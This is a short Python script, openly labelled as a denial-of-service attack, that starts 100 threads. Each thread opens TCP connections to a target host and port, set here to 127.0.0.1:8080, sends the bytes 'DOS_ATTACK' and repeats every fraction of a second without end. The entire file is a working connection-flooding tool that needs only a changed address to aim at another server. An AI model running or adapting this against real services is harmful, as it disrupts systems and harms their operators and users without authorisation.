import socket
import threading
import time
import random

TARGET = "127.0.0.1"
PORT = 8080

def attack_thread():
    while True:
        try:
            s = socket.socket()
            s.connect((TARGET, PORT))
            s.sendall(b"DOS_ATTACK")
            s.close()
        except:
            pass
        time.sleep(random.uniform(0.2,0.4))

if __name__ == "__main__":
    for _ in range(100):
        threading.Thread(target=attack_thread, daemon=True).start()
    while True:
        time.sleep(1)
